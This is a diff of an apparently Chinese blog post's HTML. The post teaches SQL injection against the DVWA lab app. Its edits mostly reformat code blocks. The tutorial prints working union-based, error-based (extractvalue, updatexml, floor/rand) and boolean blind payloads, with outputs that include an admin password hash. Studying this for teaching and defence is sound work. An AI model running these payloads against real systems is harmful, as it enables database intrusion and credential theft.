@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="学无止境">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="永无止境">
 <title>SQL注入：从入门到入土</title>
 
 <link rel='canonical' href='https://blog.928330.xyz/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/'>
 
 <link rel="stylesheet" href="/scss/style.min.e3073096d25e5a3d746191d039ec1146fd3a3920d63ab62f3cacf37f04c37a53.css"><meta property='og:title' content="SQL注入：从入门到入土">
-<meta property='og:description' content="学无止境">
+<meta property='og:description' content="永无止境">
 <meta property='og:url' content='https://blog.928330.xyz/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/'>
 <meta property='og:site_name' content='kakahuote'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='SQL' /><meta property='article:published_time' content='2025-07-02T00:52:02&#43;08:00'/><meta property='article:modified_time' content='2025-07-09T21:25:59&#43;08:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='SQL' /><meta property='article:published_time' content='2025-07-02T00:52:02&#43;08:00'/><meta property='article:modified_time' content='2025-07-10T14:21:55&#43;08:00'/>
 <meta name="twitter:title" content="SQL注入：从入门到入土">
-<meta name="twitter:description" content="学无止境">
+<meta name="twitter:description" content="永无止境">
     <link rel="shortcut icon" href="/favicon.ico" />
 <!DOCTYPE html>
 <html lang="zh-CN">
@@ -624,7 +624,7 @@
         </h2>
         
         <h3 class="article-subtitle">
-            学无止境
+            永无止境
         </h3>
         
 
@@ -663,7 +663,7 @@
 
 
                <time>
-                   更新时间：2025-07-09
+                   更新时间：2025-07-10
                </time>
            </div>
         <div>
@@ -841,10 +841,10 @@
 <p><span style="color:#fab920;font-size:15px"><strong>不过在此之前，先检查一下你之前的语句有没有写对吧~</strong></span></p>
 <h3 id="2猜测sql查询语句中的字段数列数">2.猜测SQL查询语句中的字段数（列数）
 </h3><p><strong>从1开始，使用order by语句指定查询结果依照第n列排序，如果报错，说明不存在该行列</strong></p>
-<pre tabindex="0"><code>1&#39; or 1=1 order by 1 #   
-1&#39; or 1=1 order by 2 #  
-1&#39; or 1=1 order by 3 #      //报错了
-</code></pre><p>order by 3的时候报错，说明当前查询的表中只有2列</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; or 1=1 order by 1 #   
+</span></span><span style="display:flex;"><span>1&#39; or 1=1 order by 2 #  
+</span></span><span style="display:flex;"><span>1&#39; or 1=1 order by 3 #      //报错了
+</span></span></code></pre></div><p>order by 3的时候报错，说明当前查询的表中只有2列</p>
 <blockquote>
 <p><strong><code>and</code>：如果and前为真，执行后面内容</strong></p>
 <p><strong><code>or</code>：如果前面为假，才执行后面内容</strong></p></blockquote>
@@ -853,8 +853,8 @@
 <p>假如其中某些字段的查询结果是会返回到前端的，那么我们就需要知道这些字段中哪些结果会回显，如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试</p>
 <p><strong>这时候我们利用一个简单的语句：select 1,2,3，根据显示在页面上的数字就可以知道回显位置（sql特性）</strong></p>
 <p>之后，我们只需要把这个数字改成我们想查询的内容（如id,password），就会在窗口显示我们想要的结果</p>
-<pre tabindex="0"><code>1&#39; union select 1,2 #
-</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250626115719525.png"
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,2 #
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250626115719525.png"
 	
 	
 	
@@ -872,8 +872,8 @@
 <h3 id="4获取当前数据库">4.获取当前数据库
 </h3><p>知道了回显位，我们就可以把回显位替换成想要的数据</p>
 <p><strong><mark>这里一定要写全，有多少字段，select后面就要有多少相应的字段</mark></strong>：</p>
-<pre tabindex="0"><code>1&#39; union select 1,database() #
-</code></pre><p><strong><code>database()</code> 是mysql内置函数，当数据库执行到它时，会将其替换为当前正在使用的数据库的名称</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,database() #
+</span></span></code></pre></div><p><strong><code>database()</code> 是mysql内置函数，当数据库执行到它时，会将其替换为当前正在使用的数据库的名称</strong></p>
 <p><img src="http://picture.928330.xyz/typora/image-20250626135800624.png"
 	
 	
@@ -926,8 +926,8 @@
   </tbody>
 </table></div>
 <p>我们就可以从中得到想要的信息：</p>
-<pre tabindex="0"><code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
-</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250626142534142.png"
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250626142534142.png"
 	
 	
 	
@@ -938,8 +938,8 @@
 	
 ></p>
 <p>上面的语句效果等同于下面的语句，只不过使用了<code>group_concat()</code>，让输出的内容拼成了一个字符串：</p>
-<pre tabindex="0"><code>1&#39; union select 1,table_name from information_schema.tables where table_schema=&#39;dvwa&#39; #
-</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250626142649062.png"
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,table_name from information_schema.tables where table_schema=&#39;dvwa&#39; #
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250626142649062.png"
 	
 	
 	
@@ -999,8 +999,8 @@
   </tbody>
 </table></div>
 <p>同样借此获取users表的字段：</p>
-<pre tabindex="0"><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()#
-</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250706113907039.png"
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()#
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250706113907039.png"
 	
 	
 	
@@ -1012,8 +1012,8 @@
 ></p>
 <p>这样就得到了users表的所有的列名称</p>
 <p><strong>这里要注意的是，除了指定表名之外，还要指定数据库名，否则就会出现很多不属于这个表的列名：</strong></p>
-<pre tabindex="0"><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #
-</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250626144509634.png"
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250626144509634.png"
 	
 	
 	
@@ -1026,8 +1026,8 @@
 <h3 id="7获取字段信息">7.获取字段信息
 </h3><p><strong>知道了表名和列名，就能轻松获取对应信息了</strong></p>
 <p>比如我想获取所有用户的id名称和对应密码：</p>
-<pre tabindex="0"><code>1&#39; union select group_concat(user_id,first_name),group_concat(password) from users #
-</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250626145455797.png"
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select group_concat(user_id,first_name),group_concat(password) from users #
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250626145455797.png"
 	
 	
 	
@@ -1041,8 +1041,8 @@
 <h3 id="8逐行获取信息">8.逐行获取信息
 </h3><p><strong>书接上文，如果我只想要显示某一条信息，就可以在末尾加上<code>limit m,n</code></strong></p>
 <p><strong>意思是从第m条数据开始，显示包括n条数据，比如<code>limit 0,1</code>，就是只显示第1条数据（数据从0开始存储）</strong></p>
-<pre tabindex="0"><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 1,1 #
-</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250627113327247.png"
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 1,1 #
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250627113327247.png"
 	
 	
 	
@@ -1070,18 +1070,18 @@
 </li>
 </ul>
 <p><mark><strong>我们可以利用concat拼接任意非法字符和查询语句/函数，这样想要得到的内容就会随着报错一并回显：</strong></mark></p>
-<pre tabindex="0"><code>1&#39; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#
-</code></pre><p>0x7e是~的十六进制，而~不属于xpath语法格式，因此会报出xpath语法错误：</p>
-<pre tabindex="0"><code>XPATH syntax error: &#39;~dvwa~&#39;
-</code></pre><p><strong>我们使用了<code>database()</code>函数，而sql会执行这个函数，返回函数结果，就带出了数据库名称</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#
+</span></span></code></pre></div><p>0x7e是~的十六进制，而~不属于xpath语法格式，因此会报出xpath语法错误：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>XPATH syntax error: &#39;~dvwa~&#39;
+</span></span></code></pre></div><p><strong>我们使用了<code>database()</code>函数，而sql会执行这个函数，返回函数结果，就带出了数据库名称</strong></p>
 <h4 id="updatexml-xml_document-xpath_string-new_value">updatexml (XML_document, XPath_string, new_value)
 </h4><ul>
 <li>第一个参数：<code>XML_document</code> 是目标XML文档</li>
 <li>第二个参数：<code>XPath_string</code> <strong>是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容</strong></li>
 <li>第三个参数：<code>new_value</code> 用来替换查找到的符合条件的数据</li>
 </ul>
-<pre tabindex="0"><code>1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),3)#
-</code></pre><p>也是同理会报错</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),3)#
+</span></span></code></pre></div><p>也是同理会报错</p>
 <p><span style="color:#fab920;font-size:20px"><strong>之后的演示我会以<code>updatexml()</code>和<code>extractvalue()</code>为主</strong></span></p>
 <p><span style="color:#fab920;font-size:20px"><strong>但在此之前，我还想介绍一些其他的好玩的函数(当然也很有用!）👇</strong></span></p>
 <h3 id="不那么常用的函数">不那么常用的函数
@@ -1096,8 +1096,8 @@
 </span></span><span style="display:flex;"><span>(<span style="color:#c678dd">select</span> <span style="color:#d19a66">1</span> <span style="color:#c678dd">from</span> 
 </span></span><span style="display:flex;"><span>(<span style="color:#c678dd">select</span> <span style="color:#c678dd">count</span>(<span style="color:#56b6c2">*</span>),<span style="color:#e06c75">concat</span>((<span style="color:#c678dd">select</span> <span style="color:#c678dd">table_name</span> <span style="color:#c678dd">from</span> <span style="color:#e06c75">information_schema</span>.<span style="color:#e06c75">tables</span> <span style="color:#c678dd">where</span> <span style="color:#e06c75">table_schema</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;dvwa&#39;</span> <span style="color:#c678dd">limit</span> <span style="color:#d19a66">0</span>,<span style="color:#d19a66">1</span>),<span style="color:#e06c75">floor</span>(<span style="color:#e06c75">rand</span>(<span style="color:#d19a66">0</span>)<span style="color:#56b6c2">*</span><span style="color:#d19a66">2</span>))<span style="color:#e06c75">x</span> <span style="color:#c678dd">from</span> <span style="color:#e06c75">information_schema</span>.<span style="color:#e06c75">tables</span> <span style="color:#c678dd">group</span> <span style="color:#c678dd">by</span> <span style="color:#e06c75">x</span>)<span style="color:#e06c75">a</span>)
 </span></span></code></pre></div><p>现在，我们输入这样的注入语句：</p>
-<pre tabindex="0"><code>1&#39; and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)#
-</code></pre><p>我们看看每一个部分的作用：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)#
+</span></span></code></pre></div><p>我们看看每一个部分的作用：</p>
 <ul>
 <li>
 <p><strong><code>floor(rand(0)\*2)</code></strong></p>
@@ -1136,8 +1136,8 @@
 <p>第三行：此时<code>rand()</code>第四次被调用，计算出的键是<code>'dvwa0'</code>，表里没有这个键，所以sql准备插入，此时第五次调用<code>rand()</code>，计算出<code>'dvwa1'</code>插入</p>
 <p>等等，不对！表里已经有<code>'dvwa1'</code>了！</p>
 <p>这就导致sql尝试插入一个已经存在的键，从而触发了**“主键重复”（<code>Duplicate entry</code>）的错误：**</p>
-<pre tabindex="0"><code>Duplicate entry &#39;dvwa1&#39; for key &#39;group_key&#39;
-</code></pre></li>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Duplicate entry &#39;dvwa1&#39; for key &#39;group_key&#39;
+</span></span></code></pre></div></li>
 </ul>
 <p><strong>这样，就把数据库名称带了出来</strong></p>
 <p><strong>同时，我们还能总结出这样的规律：</strong></p>
@@ -1167,11 +1167,11 @@
 </a></p>
 <h4 id="st_latfromgeohashgeohash_string">ST_LatFromGeoHash(geohash_string)
 </h4><p><strong>参数是一个GeoHash格式的字符串，如果格式不对，函数就会报错，并可能返回导致错误的非法字符串</strong></p>
-<pre tabindex="0"><code>1&#39; and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))#
-</code></pre><p>和XPath_string一样，<code>~</code>不是GeoHash格式里面的合法字符，如果使用就会报错，同时带出数据：</p>
-<pre tabindex="0"><code>FUNCTION dvwa.ST_LatFromGeoHash does not exist
-		           ↑↑↑↑↑
-</code></pre><h4 id="st_longfromgeohashgeohash_string">ST_LongFromGeoHash(geohash_string)
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))#
+</span></span></code></pre></div><p>和XPath_string一样，<code>~</code>不是GeoHash格式里面的合法字符，如果使用就会报错，同时带出数据：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>FUNCTION dvwa.ST_LatFromGeoHash does not exist
+</span></span><span style="display:flex;"><span>		           ↑↑↑↑↑
+</span></span></code></pre></div><h4 id="st_longfromgeohashgeohash_string">ST_LongFromGeoHash(geohash_string)
 </h4><p><strong>利用原理与<code>ST_LatFromGeoHash</code>完全相同</strong></p>
 <h4 id="st_pointfromgeohashgeohash_string-srid">ST_PointFromGeoHash(geohash_string, srid)
 </h4><p><strong>好吧和上面还是一样的</strong></p>
@@ -1186,63 +1186,63 @@
 </ul>
 <p>一个合法的GTID单元由两部分组成，用冒号隔开：<code>source_id:transaction_id</code></p>
 <p><strong>当任意一个参数不是合法的GTID集合格式时，函数就会报错，并可能返回非法参数的内容</strong></p>
-<pre tabindex="0"><code>1&#39; and GTID_SUBSET(database(), 1)#
-</code></pre><p>报错结果：</p>
-<pre tabindex="0"><code>FUNCTION dvwa.GTID_SUBSET does not exist
-</code></pre><p><span style="color:#fab920;font-size:20px"><strong>好啦，函数介绍就到此为止，下面我们正式开始报错注入的步骤！</strong></span></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and GTID_SUBSET(database(), 1)#
+</span></span></code></pre></div><p>报错结果：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>FUNCTION dvwa.GTID_SUBSET does not exist
+</span></span></code></pre></div><p><span style="color:#fab920;font-size:20px"><strong>好啦，函数介绍就到此为止，下面我们正式开始报错注入的步骤！</strong></span></p>
 <h3 id="爆破数据库名称">爆破数据库名称
-</h3><pre tabindex="0"><code>1&#39; and extractvalue(1,concat(0x7e,database(),0x7e)) #
-
-1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) #
-</code></pre><p>出现下面报错：</p>
-<pre tabindex="0"><code>XPATH syntax error: &#39;~dvwa~&#39;
-</code></pre><p>这就得到了数据库的名称：dvwa</p>
+</h3><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and extractvalue(1,concat(0x7e,database(),0x7e)) #
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) #
+</span></span></code></pre></div><p>出现下面报错：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>XPATH syntax error: &#39;~dvwa~&#39;
+</span></span></code></pre></div><p>这就得到了数据库的名称：dvwa</p>
 <p>可能你会有疑惑，为什么要用<code>~</code>包裹内容呢？</p>
 <p>这一方面是方便我们看返回的结果，另一方面嘛，我们接着往下看</p>
 <h3 id="爆破表名">爆破表名
 </h3><p>由于 extractvalue() 最大返回长度为 32 ，所以最好用 limit N,1 一行一行的进行回显</p>
-<pre tabindex="0"><code>1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 0,1),0x7e)) #
-
-1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1,1),0x7e)) #
-</code></pre><p>分别出现下面报错：</p>
-<pre tabindex="0"><code>XPATH syntax error: &#39;~guestbook~&#39;
-
-XPATH syntax error: &#39;~users~&#39;
-</code></pre><p>而如果不用limit语句，则会出现下面的报错：</p>
-<pre tabindex="0"><code>Subquery returns more than 1 row
-</code></pre><p><strong>这不是我们想要的，所以limit语句很重要！</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 0,1),0x7e)) #
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1,1),0x7e)) #
+</span></span></code></pre></div><p>分别出现下面报错：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>XPATH syntax error: &#39;~guestbook~&#39;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>XPATH syntax error: &#39;~users~&#39;
+</span></span></code></pre></div><p>而如果不用limit语句，则会出现下面的报错：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Subquery returns more than 1 row
+</span></span></code></pre></div><p><strong>这不是我们想要的，所以limit语句很重要！</strong></p>
 <h3 id="爆破列名">爆破列名
-</h3><pre tabindex="0"><code>1&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),0x7e)) #
-
-1&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),0x7e)) #
-</code></pre><p>分别出现下面报错：</p>
-<pre tabindex="0"><code>XPATH syntax error: &#39;~user~&#39;
-
-XPATH syntax error: &#39;~password~&#39;
-</code></pre><h3 id="爆破字段内容">爆破字段内容
-</h3><pre tabindex="0"><code>1&#39; and extractvalue(1,concat(0x7e,(select concat_ws(&#39;,&#39;,user,password) from users limit 0,1),0x7e)) #
-</code></pre><p>出现下面的报错：</p>
-<pre tabindex="0"><code>XPATH syntax error: &#39;~admin,5f4dcc3b5aa765d61d8327deb&#39;
-</code></pre><p>这里我们使用了<code>concat_ws</code>函数，指定把<code>user</code>和<code>password</code>字段使用<code>,</code>拼接再返回，这样就能实现查询多列</p>
+</h3><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),0x7e)) #
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>1&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),0x7e)) #
+</span></span></code></pre></div><p>分别出现下面报错：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>XPATH syntax error: &#39;~user~&#39;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>XPATH syntax error: &#39;~password~&#39;
+</span></span></code></pre></div><h3 id="爆破字段内容">爆破字段内容
+</h3><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and extractvalue(1,concat(0x7e,(select concat_ws(&#39;,&#39;,user,password) from users limit 0,1),0x7e)) #
+</span></span></code></pre></div><p>出现下面的报错：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>XPATH syntax error: &#39;~admin,5f4dcc3b5aa765d61d8327deb&#39;
+</span></span></code></pre></div><p>这里我们使用了<code>concat_ws</code>函数，指定把<code>user</code>和<code>password</code>字段使用<code>,</code>拼接再返回，这样就能实现查询多列</p>
 <p>如果不使用，就会出现下面的报错：</p>
-<pre tabindex="0"><code>Operand should contain 1 column(s)
-</code></pre><p>然而，正如上面所说，<code>extractvalue()</code> 函数最大返回32个字符，所以现在得到的并非完整的信息，这一点我们也能从结果末尾没有<code>~</code>看出来**（所以两边都加<code>~</code>是比较明智的选择）**</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Operand should contain 1 column(s)
+</span></span></code></pre></div><p>然而，正如上面所说，<code>extractvalue()</code> 函数最大返回32个字符，所以现在得到的并非完整的信息，这一点我们也能从结果末尾没有<code>~</code>看出来**（所以两边都加<code>~</code>是比较明智的选择）**</p>
 <p>所以，我们要适当舍弃一些东西，比如把admin单独拿出来，或者使用**<code>substring()</code>函数**</p>
 <blockquote>
 <p><strong><code>substring(strings,m,n)</code>：从strings的第m个字符开始，向后截取n个字符。</strong>
 <strong><mark>注意</mark>：1.<code>substring()</code>的开始位置为1，和<code>limit</code>不一样！</strong>
 <strong>2.通常<code>substr()</code>可以代替它，用法也相同；而<code>mid()</code>总是可以代替它，因为就是它的别名</strong>
 <strong><mark>substr()=substring()=mid()</mark></strong></p></blockquote>
-<pre tabindex="0"><code>1&#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(&#39;,&#39;,user,password), 1, 30) from users limit 0,1),0x7e)) #
-
-1&#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(&#39;,&#39;,user,password), 31, 30) from users limit 0,1),0x7e)) #
-</code></pre><p>分别得到下面的报错：</p>
-<pre tabindex="0"><code>XPATH syntax error: &#39;~admin,5f4dcc3b5aa765d61d8327de~&#39;
-
-XPATH syntax error: &#39;~b882cf99~&#39;
-</code></pre><p>拼接得到完整的用户名和密码：</p>
-<pre tabindex="0"><code>admin,5f4dcc3b5aa765d61d8327deb882cf99
-</code></pre><p><strong>利用<code>substring()</code>，即使字段长度远远大于32，我们也能一点点凑出完整的内容</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(&#39;,&#39;,user,password), 1, 30) from users limit 0,1),0x7e)) #
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>1&#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(&#39;,&#39;,user,password), 31, 30) from users limit 0,1),0x7e)) #
+</span></span></code></pre></div><p>分别得到下面的报错：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>XPATH syntax error: &#39;~admin,5f4dcc3b5aa765d61d8327de~&#39;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>XPATH syntax error: &#39;~b882cf99~&#39;
+</span></span></code></pre></div><p>拼接得到完整的用户名和密码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>admin,5f4dcc3b5aa765d61d8327deb882cf99
+</span></span></code></pre></div><p><strong>利用<code>substring()</code>，即使字段长度远远大于32，我们也能一点点凑出完整的内容</strong></p>
 <h2 id="3-盲注">#3 盲注
 </h2><p><strong>有的时候存在注入点，但是前端并不会回显注入结果，这就需要用特殊方式判断我们是否注入成功</strong></p>
 <h3 id="常用函数-2">常用函数
@@ -1286,26 +1286,26 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 </table></div>
 <h3 id="布尔盲注">布尔盲注
 </h3><p>当我们查询的数据在数据库存在时，就会返回：</p>
-<pre tabindex="0"><code>User ID exists in the database
-</code></pre><p>反之，则会返回：</p>
-<pre tabindex="0"><code>User ID is MISSING from the database
-</code></pre><p>我们可以构造一些判别式，观察页面返回值，来判断输入的语句是否为真</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>User ID exists in the database
+</span></span></code></pre></div><p>反之，则会返回：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>User ID is MISSING from the database
+</span></span></code></pre></div><p>我们可以构造一些判别式，观察页面返回值，来判断输入的语句是否为真</p>
 <h4 id="猜测长度">猜测长度
 </h4><p><strong>使用与(and)：</strong></p>
-<pre tabindex="0"><code>1&#39; and length(database())=4 #
-</code></pre><p><strong>使用或(or)：</strong></p>
-<pre tabindex="0"><code>&#39; or length(database())=4 #
-</code></pre><p>页面返回exists，说明数据库名称长度为4</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and length(database())=4 #
+</span></span></code></pre></div><p><strong>使用或(or)：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#39; or length(database())=4 #
+</span></span></code></pre></div><p>页面返回exists，说明数据库名称长度为4</p>
